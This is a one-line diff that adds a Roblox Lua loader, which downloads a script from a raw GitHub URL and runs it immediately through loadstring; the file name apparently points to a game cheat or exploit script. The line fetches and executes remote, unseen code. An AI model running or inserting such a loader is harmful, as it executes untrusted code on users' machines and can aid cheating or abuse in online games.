@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/just-one-more-asym-spam3-x4dc6t0ambhs8d.lua"))()
